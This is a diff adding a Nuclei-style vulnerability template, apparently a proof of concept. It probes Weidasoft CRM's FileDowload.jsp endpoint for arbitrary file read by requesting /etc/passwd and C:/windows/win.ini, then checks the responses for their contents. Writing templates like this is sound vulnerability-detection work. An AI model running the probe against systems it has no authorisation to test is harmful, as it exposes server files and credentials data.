@@ -1,0 +1,31 @@
+id: poc-yaml-weidasoft-filedowload-anyfile-read
+
+info:
+  name: Weidasoft CRM FileDowload Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  paths:
+    - "C:/windows/win.ini"
+    - "/etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/file/FileDowload.jsp?url={{paths}}"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "filename="
+      - type: dsl
+        dsl:
+          - "contains(body, '[files]') && contains(body, 'bit app support')"
+          - "contains(body, 'root:') && contains(body, '/bin')"
